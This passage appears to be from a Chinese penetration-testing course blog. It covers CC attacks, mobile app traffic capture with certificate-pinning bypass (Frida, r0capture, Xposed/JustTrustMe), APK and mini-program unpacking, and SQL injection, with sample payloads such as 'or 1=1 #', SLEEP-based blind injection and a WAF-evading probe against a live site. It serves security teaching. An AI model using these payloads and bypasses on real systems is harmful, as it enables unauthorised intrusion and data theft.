title="攻击介绍"></a><strong>攻击介绍</strong></h4><p><strong>1、介绍</strong></p><p>​CC攻击是一种试图通过使目标系统的资源耗尽来提供拒绝服务的攻击方式。它通常基于建立大量无效的连接或发送大量恶意请求，超过目标系统的处理能力，从而导致系统崩溃或无法正常工作。CC攻击通常由单台计算机或少量机器发起。</p><p><strong>2、原理</strong></p><p>​CC攻击通常运用于通过攻击种子服务器（Seed Server）发出大量伪造的请求或连接来骚扰目标系统。这种攻击通常通过模拟大量用户访问（如使用恶意脚本或利用漏洞）来获取目标系统的资源。攻击者还可以使用代理服务器、TOR网络等技术来隐藏自己的身份和位置。</p><p><strong>3、与DDOS的区别</strong></p><p>​规模和资源使用：CC攻击通常是相对较小规模的攻击，通常仅由一台计算机或几台计算机发起，资源使用相对较少。DDoS攻击则是通过使用分布在全球范围内的多台计算机，协同合作发起大规模攻击，消耗更多的网络资源和带宽。</p><p>​攻击方式：CC攻击的目标是耗尽目标系统的资源，通过建立大量的无效连接或发送恶意请求来实现。DDoS攻击则在通过大量流量发送来超出目标系统的处理能力，让系统无法正常运行。</p><p>​攻击协同性：CC攻击通常由单台计算机或少量机器发起，攻击者的目标是通过耗尽目标资源来实现拒绝服务。DDoS攻击则涉及到多个攻击端（发起者），它们可以同时从多个方面攻击目标系统，通过协调行动提高攻击效果。</p><p><strong>4、CC攻击防御</strong>：</p><ul><li>限制连接请求的速率</li><li>使用验证码</li><li>检测和封锁代理服务器</li><li>监测网络流量，识别异常行为，使用入侵检测系统和防火墙</li></ul><h4 id="测试方法-6"><a href="#测试方法-6" class="headerlink" title="测试方法"></a>测试方法</h4><p>使用安防cc进行测试</p><p><img src="/img/oldboy/image-20250330104933122.png" alt="image-20250330104933122"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​<strong>以上就是相关DDOS的知识总结，欢迎和博主进行技术交流VX：GoldY_66</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 老男孩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 老男孩安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老男孩--手机端信息收集及渗透(3)</title>
      <link href="/2025/05/12/oldboy3/"/>
      <url>/2025/05/12/oldboy3/</url>
      
        <content type="html"><![CDATA[<h1 id="——–APP———"><a href="#——–APP———" class="headerlink" title="——–APP———-"></a>——–APP———-</h1><h2 id="APP资产收集"><a href="#APP资产收集" class="headerlink" title="APP资产收集"></a>APP资产收集</h2><p>APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取</p><h3 id="AppInfoScanner"><a href="#AppInfoScanner" class="headerlink" title="AppInfoScanner"></a>AppInfoScanner</h3><p>项目地址：<a href="https://github.com/kelvinBen/AppInfoScanner">kelvinBen&#x2F;AppInfoScanner</a></p><p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p><p>使用配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd AppInfoScanner</span><br><span class="line">python -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>运行方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录</span></span><br><span class="line">python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录</span></span><br><span class="line">python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描Web站点的文件、目录、需要缓存的站点URl</span></span><br><span class="line">python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;</span><br></pre></td></tr></table></figure><p>信息提取较少</p><h3 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h3><p>移动安全框架 （MobSF） 是一个适用于 Android、iOS 和 Windows Mobile 移动应用程序的安全研究平台。MobSF 可用于各种使用案例，例如移动应用程序安全、渗透测试、恶意软件分析和隐私分析。Static Analyzer 支持流行的移动应用程序二进制文件，如 APK、IPA、APPX 和源代码。同时，Dynamic Analyzer 支持 Android 和 iOS 应用程序，并为交互式插桩测试、运行时数据和网络流量分析提供了一个平台。MobSF 与您的 DevSecOps 或 CI&#x2F;CD 管道无缝集成，由 REST API 和 CLI 工具提供便利，轻松增强您的安全工作流程。</p><p>项目地址：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF&#x2F;Mobile-Security-Framework-MobSF</a></p><p>快速搭建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf:latest</span><br><span class="line">docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default username and password: mobsf/mobsf</span></span><br></pre></td></tr></table></figure><h2 id="抓包实现"><a href="#抓包实现" class="headerlink" title="抓包实现"></a>抓包实现</h2><h3 id="HTTP-S流量"><a href="#HTTP-S流量" class="headerlink" title="HTTP&#x2F;S流量"></a>HTTP&#x2F;S流量</h3><p>​</p><p>1、Charles工具导出证书</p><img src="/img/oldboy/image-20250422143708653.png" alt="image-20250422143708653" style="zoom: 50\%;" /><p>​将证书导出，推荐为cer后缀</p><p>2、Fidder导出证书</p><img src="/img/oldboy/image-20250422144237975.png" alt="image-20250422144237975" style="zoom:50\%;" /><p>3、Burp导出证书</p><img src="/img/oldboy/image-20250422144555190.png" alt="image-20250422144555190" style="zoom: 33\%;" /><p>模拟器配置（夜神模拟器）：</p><img src="/img/oldboy/image-20250422143523177.png" alt="image-20250422143523177" style="zoom:50\%;" /><p>将证书导入即可</p><p>配置代理：</p><img src="/img/oldboy/image-20250422145552048.png" alt="image-20250422145552048" style="zoom: 33\%;" /><h3 id="其他流量"><a href="#其他流量" class="headerlink" title="其他流量"></a>其他流量</h3><p>抓不到数据包有两种情况：<br>    1.反代理机制<br>    2.证书问题</p><p>如果数据走的ssl https，那么数据包有三种验证情况：<br>    情况1，客户端不存在证书校验，服务器也不存在证书校验。<br>    情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。<br>    情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。</p><p>开了浏览器后，访问baidu.com的话会一直提示，前提介绍到burp fiddler 需要配置模拟器安装证书才能抓取https（工具证书）<br>访问这个app的接受服务器就相当于利用的是burp证书，和原来的app证书不一样，这样就是证书问题。校验不通过，存在异常的情况。<br>怎么区别是反代理还是证书。最简单的方法是反编译，看反代理有没有代码。还可以自己推测。</p><p>反代理检测：<br>1、自身的抓包应用<br>用工具（packet capture）进行抓包，如果显示正常就证明是反代理，如果异常就是证书。这种是没有设置代理，只是抓包而已。</p><p>2.用Proxifier<br>如果设置系统代理：<br>APP检测到设置了代理，GG<br>相当于在模拟器或手机设置代理<br>app–&gt;代理服务器–&gt;burp–&gt;服务端</p><p>如果用了proxifier，借助网络接口出口数据，不需要设置代理<br>相当于在网络出口设置代理<br>app–&gt;（已经逃离了模拟器或者手机）proxifier–&gt;本地burp–&gt;服务器<br>app模拟器 模拟器的网络出口数据是通过本机进行的<br>那么应该怎么操作呢？在proxifier中，找到配置文件中的代理服务器，添加一个127.0.0.1:8888的https协议的代理</p><h4 id="proxifier-charles"><a href="#proxifier-charles" class="headerlink" title="proxifier+charles"></a>proxifier+charles</h4><p><strong>可以绕过简单的反代理机制</strong></p><p>1、启动proxifier配置代理服务器和代理规则</p><img src="/img/oldboy/image-20250423095328356.png" alt="image-20250423095328356" style="zoom: 33\%;" /><img src="/img/oldboy/image-20250423095407798.png" alt="image-20250423095407798" style="zoom: 50\%;" /><p>配置代理规则：配置文件–&gt;代理规则–&gt;添加规则<br>找到夜神模拟器的对应进程：<br>C:\Program Files (x86)\Bignox\BigNoxVM\RT\NoxVMHandle.exe<br>G:\tools\nox_setup_v7.0.2.7_full\Nox\bin\Nox.exe</p><p>2、启动charles</p><p>3、点击想要抓包的应用</p><img src="/img/oldboy/image-20250423095526218.png" alt="image-20250423095526218" style="zoom:25\%;" /><p><img src="/img/oldboy/image-20250423095557054.png" alt="image-20250423095557054"></p><h4 id="frida-r0capture"><a href="#frida-r0capture" class="headerlink" title="frida+r0capture"></a>frida+r0capture</h4><p><strong>可以绕过反代理和所有证书问题</strong></p><p><strong>使用frida+r0capture</strong></p><p>frida：<a href="https://github.com/frida/frida">frida&#x2F;frida: Clone this repo to build Frida</a></p><p>Fr0ysue：<a href="https://links.jianshu.com/go?to=https%5C:%5C/%5C/github.com%5C/r0ysue%5C/r0capture">https://links.jianshu.com/go?to=https\%3A\%2F\%2Fgithub.com\%2Fr0ysue\%2Fr0capture</a></p><p>frida版本和python版本以及Android要对应，python版本过高会导致frida不可用，以下是不严谨的版本对应关系<br>    frida12.3.6 –&gt; python3.7 –&gt; Android5-6<br>    frida12.8.0 –&gt;Python3.8–&gt;Android7-8<br>    frida14–&gt;Python3.8–&gt;Android9</p><p>1、下载相关依赖</p><p>确保自己电脑安装python环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意下载版本</span></span></span><br></pre></td></tr></table></figure><p>安装与frida版本一致的frida工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip list</span><br><span class="line">frida-16.7.13-cp37-abi3-win_amd64.whl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装包</span></span><br><span class="line">frida-server-16.7.13-android-x86.xz</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解压frida-server-16.7.13-android-x86.xz</p><p>2、将frida移动到模拟器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入夜神模拟器文件夹进入夜神模拟器文件夹</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">adb.exe push E:\hackerTools\tools\APK小程序\frida-server-16.7.13-android-x86 /data/local/frida</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打开虚拟机终端</span></span><br><span class="line">adb shell </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到这个目录</span></span><br><span class="line">cd /data/local</span><br><span class="line">chmod 777 frida </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行本文件(但是执行了还不能用需要映射一下)</span></span><br><span class="line">./frida </span><br><span class="line"></span><br><span class="line">(这个终端不可以关闭，关闭了就相当于给关闭frida了)</span><br><span class="line">（下次用就直接启动执行就行了，但是每次都要绑定端口）</span><br></pre></td></tr></table></figure><p>新开一个终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042 (绑定虚拟机的端口到主机)</span><br><span class="line"></span><br><span class="line">检测是否可以执行</span><br><span class="line"></span><br><span class="line">frida-ps -U</span><br><span class="line"></span><br><span class="line">frida-ps -R</span><br><span class="line"></span><br><span class="line">（不用进模拟器终端，在外面执行）</span><br></pre></td></tr></table></figure><p>3、选择要抓取的软件包</p><p>使用APK资源提取</p><p><img src="/img/oldboy/image-20250422184032119.png" alt="image-20250422184032119"></p><p>4、进行抓包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓包这个软件，并且结束的时候生成一个pcap文件（可以直接用wireshark打开）</span></span><br><span class="line">r0capture.py -U -f [目标包名或者进程号] -v -p 名字.pcap</span><br></pre></td></tr></table></figure><p>5、使用wireshark分析流量</p><h4 id="Xposed-JustTrust-HOOK"><a href="#Xposed-JustTrust-HOOK" class="headerlink" title="Xposed&amp;JustTrust&amp;HOOK"></a>Xposed&amp;JustTrust&amp;HOOK</h4><p><strong>可以绕过反代理、单向证书检测</strong></p><p>1、在夜神模拟器中安装Xposed，打开后点一下version进行安装，需要root权限才能安装完成。</p><p><img src="/img/oldboy/2504969-20230913135634649-1088236033.png" alt="image.png"></p><p>2、重启后，安装两个apk：JustTrustMe.apk和JustMePlush.apk，然后再次重启。然后再次开启代理</p><p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135634649-1088236033.png" alt="image.png"></p><p>在Xposed上，点击三符号，然后选择模块</p><p>3、然后重启，其实就是利用这两个模块，把app里面的检测功能屏蔽掉。</p><p>然后在打开JustMePlush，选择牛牛棋牌，然后点一下说保存成功。</p><p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135635161-1688298366.png" alt="image.png"></p><p>4、抓取数据包</p><p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135635718-1154018818.png" alt="image.png"></p><h1 id="——–APK———–"><a href="#——–APK———–" class="headerlink" title="——–APK———–"></a>——–APK———–</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>1、反编译</strong></p><p>​将APK文件反编译成静态资源以及源码</p><p><strong>2、反编译静态资源</strong></p><p>​APK实际上就是一个压缩包，可以通过直接修改后缀为zip的方式解压得到静态资源</p><p><strong>3、反编译后的文件结构</strong></p><p>assets文件夹</p><p>​assets 这里存放的是静态资源文件(图片，视频等)，这个文件夹下的资源文件不会被编译。不被编译的资源文件是指在编译过程中不会被转换成二进制代码的文件，而是直接被打包到最终的程序中。这些文件通常是一些静态资源，如图片、音频、文本文件等。</p><p>lib文件夹</p><p>​lib：.so库(c或c++编译的动态链接库)。APK文件中的动态链接库（Dynamic Link Library，简称DLL）是一种可重用的代码库，它包含在应用程序中，以便在运行时被调用。这些库通常包含许多常见的函数和程序，可以在多个应用程序中共享，从而提高了代码的复用性和效率。</p><p>lib文件夹下的每个目录都适用于不同的环境下，armeabi-v7a目录基本通用所有android设备，arm64-v8a目录只适用于64位的android设备，x86目录常见用于android模拟器，x86-64目录适用于支持x86_64架构的Android设备(适用于支持通常称为“x86-64”的指令集的 CPU)</p><p>META-INF文件夹</p><p>​META-INF：在Android应用的APK文件中，META-INF文件夹是存放数字签名相关文件的文件夹（通过对比实现校验apk文件是否被篡改）</p><p><strong>4、加壳</strong></p><p>​为了加强Android保护强度，防止被静态反编译工具破解而泄露源码。</p><h2 id="加壳分析"><a href="#加壳分析" class="headerlink" title="加壳分析"></a>加壳分析</h2><p>1、在线网站检测加壳</p><ol><li><a href="https://www.zhihuaspace.cn:8888/">南明离火-移动安全分析平台</a></li><li><a href="https://mogua.co/">摸瓜-查诈骗APP_查病毒APP_免费APK反编译分析工具</a></li></ol><p>2、工具检测</p><p>apk查壳神器</p><p><img src="/img/oldboy/1-53.png"></p><p><strong>ApkCheckPack</strong></p><p>使用很简单，直接在命令行中通过指定目标apk即可使用</p><p><img src="/img/oldboy/b7e6f13796f3d0f8a4953825b8c6966d.png" alt="在这里插入图片描述"></p><h2 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h2><h3 id="未加壳"><a href="#未加壳" class="headerlink" title="未加壳"></a>未加壳</h3><p>未加壳得源码：在得到apk的静态资源时，文件夹里存在一个classes.dex文件，需要使用dex2jar工具对其进行反编译</p><p>1、反编译得到jar包</p><p>使用命令：</p><p>​d2j-dex2jar.bat [classes.dex所在路径]</p><p>直接将classes.dex文件复制到dex2jar文件夹中，cmd打开命令行直接执行命令</p><p>会在同级目录下生成一个classes-dex2jar.jar文件</p><p>2、分析jar包</p><p>打开jd-gui程序，将生成的jar文件导入即可</p><h3 id="静态脱壳"><a href="#静态脱壳" class="headerlink" title="静态脱壳"></a>静态脱壳</h3><p>需要搭配BlackDex64.apk使用</p><p>通过夜神模拟器将BlackDex64.apk安装</p><p>打开BlackDex64，选择脱壳的文件</p><p><img src="/img/oldboy/1-54.png"></p><p>查看DEX文件存储的文件</p><p><img src="/img/oldboy/1-55.png"></p><p>获得dex文件源码</p><p>​通过未加壳的方式，对dex进行反编译，实现源码文件资源</p><h2 id="动态脱壳"><a href="#动态脱壳" class="headerlink" title="动态脱壳"></a>动态脱壳</h2><p>1、首先模拟器安装要测试的apk</p><p>2、物理机安装frida-dexdump</p><p><img src="/img/oldboy/wps1-1740833264863-37.jpg" alt="img"> </p><p>3、将 <a href="C:\Users\ZhuanZ\Downloads\frida-server-16.6.6-android-x86.xz">frida-server-16.6.6-android-x86.xz</a> 复制到夜神模拟器bin目录下</p><p>手机模拟器实际上就是基于Linux为底层的操作系统</p><p>D:\杂项\Nox\bin\adb.exe 提供了接口可以实现连接到Linux底层</p><p>adb connect 127.0.0.1:62001</p><p>(每种模拟器的默认端口都不同)，使用adb shell命令进行测试</p><p>4、将frida-serverx86上传的模拟器</p><p>app push [frida名称] &#x2F;data&#x2F;local&#x2F;tmp</p><p>5、使用adb shell，给frida文件赋予执行权限</p><p>adb shell</p><p>chmod 777  &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-16.6.6-android-x86</p><p>.&#x2F;frida-server-16.6.6-android-x86</p><p>6、获得包名</p><p>​通过BlackDex64软件查看安装文件的包名</p><p>​<img src="/img/oldboy/1-56.png"></p><p>​</p><p>7、查看当前包名的pid</p><p><img src="/img/oldboy/wps3-1740833264863-44.jpg" alt="img"> </p><p>8、在主机上安装frida(在python中script可以看到frida工具已经安装)</p><p>pip3 install frida</p><p>pip3 install frida-tools</p><p>9、进入frida-dexdump文件夹</p><p><img src="/img/oldboy/wps4-1740833264863-40.jpg" alt="img"> </p><p>打开cmd执行</p><p>.\frida-dexdump.exe -U -p pid</p><p><img src="/img/oldboy/wps5-1740833264863-42.jpg" alt="img"> </p><p>成功脱壳</p><p><img src="/img/oldboy/wps6-1740833264863-38.jpg" alt="img"> </p><p>使用dex2jar获取jar包</p><p><img src="/img/oldboy/wps7-1740833264863-41.jpg" alt="img"> </p><p>使用jd-jui打开</p><p><img src="/img/oldboy/wps8-1740833264863-43.jpg" alt="img">  </p><h2 id="小程序逆向反编译"><a href="#小程序逆向反编译" class="headerlink" title="小程序逆向反编译"></a>小程序逆向反编译</h2><p>首先要找到小程序的存放位置D:\Tencent\WeGame\WeChat Files\Applet</p><p>如果PC微信小程序软件包加密，文件以V1MMWXQ开头，需要先进行解密才可以反编译</p><p>使用工具UnpackMiniApp.exe,将文件目录的_APP_wxapkg拖动</p><p><img src="/img/oldboy/image-20250303093556492.png" alt="image-20250303093556492"></p><p>会在wxpack文件夹下生成解密后的软件包</p><p>使用CrackMinApp进行反编译</p><p><img src="/img/oldboy/image-20250303093949117.png" alt="image-20250303093949117"></p><p>如果工具不能使用，需要手动去反编译</p><p>首先打开工具箱里的nodejs文件夹，将解密后的小程序复制到此文件夹内，打开cmd命令，执行node.exe wuWxapkg.js [xxx.wxapkg]</p><p>会在改文件夹下生成[xxx]的文件夹</p><p>使用微信小程序开发者工具进行打开</p><img src="/img/oldboy/image-20250303094828034.png" alt="image-20250303094828034" style="zoom:50\%;" /><p>获得到源码资源</p><img src="/img/oldboy/image-20250303095114113.png" alt="image-20250303095114113" style="zoom:50\%;" />]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 老男孩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 老男孩安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老男孩--Web十大常规漏洞(2)</title>
      <link href="/2025/05/12/oldboy2/"/>
      <url>/2025/05/12/oldboy2/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="注入概念"><a href="#注入概念" class="headerlink" title="注入概念"></a>注入概念</h2><p><strong>1.1.1 什么是注入漏洞（SQL）</strong></p><p>​接收相关参数未经过处理直接带入数据库查询操作</p><p>具备的两个关键点：</p><ul><li>用户能够控制输入（网站交互操作）</li><li>原本程序接受了用户输入的信息，并且直接执行（没有做过滤）</li></ul><p><strong>1.1.2 SQL注入漏洞的分类&#x2F;特点</strong></p><p>​服务端漏洞（数据库服务-代码有逻辑问题）</p><p>​与操作系统、数据库类型、脚本语言类型无关</p><p><strong>1.1.3 SQL漏洞产生原理</strong></p><p>​代码中没有对用户的传入参数信息，做处理</p><p><strong>1.1.4 SQL注入的目的</strong></p><ul><li>窃取数据信息</li><li>修改数据信息</li><li>破坏数据信息</li></ul><p>1.1.5 SQL注入攻击流程：</p><ol><li>获取攻击网站域名（子域名）</li><li>获取攻击网站注入点</li><li>获取网站业务数据库名称</li><li>获取网站业务数据表名称</li><li>获取网站业务表字段信息</li><li>获取网站业务真实数据（SQL注入目的：窃取数据）<ol><li>利用联合注入获取数据信息（配合order by获取字段数）</li></ol></li><li>实现篡改或破坏数据 （堆叠注入）</li></ol><h2 id="漏洞点查找"><a href="#漏洞点查找" class="headerlink" title="漏洞点查找"></a>漏洞点查找</h2><p><strong>SQL漏洞点获取</strong></p><ul><li>登录的地方、更新的地方、注册的地方、留言板、查询、删除等</li><li>HTTP Header:<ul><li>UA：用户指纹信息 chrome – 加载到数据库<ul><li>UA指纹信息存储，可以用于判断是否存在盗号行为</li></ul></li><li>cookie：用户登录信息</li><li>referer：记录上一个页面的地址，常用于推广记录流量信息</li></ul></li><li>与数据库交互的相关页面<ul><li><a href="http://www./*/*.com//*/*.asp?id=xx">http://www.\*\*.com/\*\*.asp?id=xx</a> (ASP注入)</li><li><a href="http://www./*/*.com//*/*.php?id=xx">http://www.\*\*.com/\*\*.php?id=xx</a>(PHP注入)</li><li><a href="http://www./*/*.com//*/*.jsp?id=xx">http://www.\*\*.com/\*\*.jsp?id=xx</a>  (JSP注入)</li></ul></li></ul><p>举例：pikachu靶场注册用户案例</p><p>访问：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_iu/sqli_reg.php#">Get the pikachu</a></p><ol><li>在提交注册前，进行请求包抓取</li><li>在burp suit中请求包发送到重发器</li><li>修改请求主体信息，加单引号</li><li>利用报错函数信息，获取数据库表名称</li></ol><p></p><p>伪静态如何实现SQL注入漏洞：</p><blockquote><p>伪静态：一般是中间件加载了伪静态插件代码，其实不是真正的静态页面</p></blockquote><p>伪静态例：</p><p>​<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p><p>&#x3D;&#x3D;&#x3D; <a href="https://www.oldboyedu.com/zuixin_wenzhang/index?id=523">https://www.oldboyedu.com/zuixin_wenzhang/index?id=523</a></p><p>验证方式</p><p>​<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p><p>​<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523/%20/%26/%26/%20-1=-2">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523\%20\%26\%26\%20-1=-2</a></p><p>注意：该网站配置了WAF防火墙，需要通过URL编码的方式进行绕过，因为对and进行了过滤，即使用&amp;&amp;进行代替</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>检测SQL漏洞</strong></p><p>根据有没有回显分为报错注入和盲注两种方式</p><h3 id="通过错误信息获取漏洞信息"><a href="#通过错误信息获取漏洞信息" class="headerlink" title="通过错误信息获取漏洞信息"></a>通过错误信息获取漏洞信息</h3><p>​id&#x3D;1 and 1&#x3D;1&#x3D;&#x3D;&gt;select * from user where id&#x3D;1 and 1&#x3D;1 ;—-成功-真</p><p>​id&#x3D;1 and 1&#x3D;2&#x3D;&#x3D;&gt;select * from user where id&#x3D;1 and 1&#x3D;2 ;—-失败-假</p><p>&#x3D;&#x3D;&#x3D;&gt; 执行结果不一致，存在漏洞（使用单引号也可以）</p><p>针对不同代码实现漏洞绕过：</p><ul><li>geekgold’ or 1&#x3D;1 – (针对asp代码的sql漏洞)</li><li>geekgold’ or 1&#x3D;1 #            (针对php代码的sql漏洞)</li></ul><p>规避SQL注入漏洞，需要对用户传入的信息做处理</p><h3 id="通过盲注的方式获取漏洞信息"><a href="#通过盲注的方式获取漏洞信息" class="headerlink" title="通过盲注的方式获取漏洞信息"></a>通过盲注的方式获取漏洞信息</h3><p><strong>1.3.2.1 基于布尔逻辑的盲注检测</strong></p><p>方法：通过构造布尔条件（如-1&#x3D;-1或-1&#x3D;-2）来观察浏览器的响应是否有变化</p><p>示例：</p><ul><li>正常请求：<code>http://example.com/page?id=1</code></li><li>盲注测试：<code>http://example.com/page?id=1 AND 1=1</code></li><li>盲注测试：<code>http://example.com/page?id=1 AND 1=2</code></li></ul><p>结果：如果<code>1=1</code>时页面正常显示，而<code>1=2</code>时页面显示异常（如空白页面或错误信息），则可能存在盲注漏洞。</p><p><strong>1.3.2.2 基于时间函数的盲注检测</strong></p><p>方法：通过构造带有时间函数的SQL语句，观察浏览器的响应时间是否有变化</p><p>示例：</p><ul><li>正常请求：<code>http://example.com/page?id=1</code></li><li>盲注测试：<code>http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)</code></li></ul><p>结果：如果页面响应时间明显延迟（如5秒），则可能存在盲注漏洞。</p><h2 id="漏洞提交方式"><a href="#漏洞提交方式" class="headerlink" title="漏洞提交方式"></a>漏洞提交方式</h2><h3 id="GET-方式进行提交"><a href="#GET-方式进行提交" class="headerlink" title="GET 方式进行提交"></a>GET 方式进行提交</h3><p><strong>GET方式提交通常会在url后有参数赋值的信息</strong></p><p>典型页面： <a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php</a></p><p><img src="/img/oldboy/1-9.png"></p><p>通过bp进行抓包查看：</p><p>​<img src="/img/oldboy/1-10.png"></p><p>漏洞验证：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+%5C%27+or+1%5C=1+%5C%23&submit=%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+\%27+or+1\%3D1+\%23&amp;submit=\%E6\%9F\%A5\%E8\%AF\%A2</a></p><h3 id="POST方式进行提交"><a href="#POST方式进行提交" class="headerlink" title="POST方式进行提交"></a>POST方式进行提交</h3><p><strong>POST方式进行提交：一般情况下用户输入的内容被隐藏起来了，地址栏看不到，需要借助抓包工具进行抓包</strong></p><p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php</a></p><p><img src="/img/oldboy/1-12.png"></p><p>通过bp进行抓包查看：</p><p><img src="/img/oldboy/1-11.png"></p><p>验证漏洞：利用bp重发器（id&#x3D;2’&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2）修改请求主体信息</p><h3 id="Cookie方式进行提交"><a href="#Cookie方式进行提交" class="headerlink" title="Cookie方式进行提交"></a>Cookie方式进行提交</h3><p><strong>原理</strong></p><p>ASP脚本中的request对象，被用于从用户那里获取信息。</p><p>Request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</p><p>eg获取从表单中提交的数据时：request.form(“参数名称”)</p><p>ASP中规定也可以省略集合名称：request(“参数名称”)，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，可能存在Cookie注入</p><p>典型页面：<a 